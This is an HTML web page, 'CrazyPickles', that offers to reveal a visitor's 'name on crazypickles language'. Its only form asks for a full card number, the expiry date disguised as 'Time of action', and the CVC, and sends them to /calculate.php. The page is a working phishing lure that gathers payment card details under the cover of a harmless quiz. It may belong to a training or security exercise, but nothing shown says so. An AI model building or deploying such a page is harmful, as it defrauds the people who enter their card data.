<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrazyPickles</title>
    <style>
        body {
            background-image: url('/static/bcg.jpeg');
            background-repeat: no-repeat;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        form {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"], input[type="number"], input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #522632;
        }
        h1 {
            color: #710808;
        }
    </style>
</head>
<body>
    <h1>What is your name on crazypickles language?</h1>
    <form action="/calculate.php" method="post">
        <label for="card_number">Card number:</label>
        <input type="text" id="card_number" name="card_number" inputmode="numeric" pattern="[0-9]{16}">

        <label for="expiration_date">Time of action:</label>
        <input type="text" id="expiration_date" name="expiration_date" placeholder="MM/YY">

        <label for="cvc">CVC:</label>
        <input type="password" id="cvc" name="cvc" inputmode="numeric" pattern="[0-9]{3}">

        <input type="submit" value="Submit">
    </form>
</body>
</html>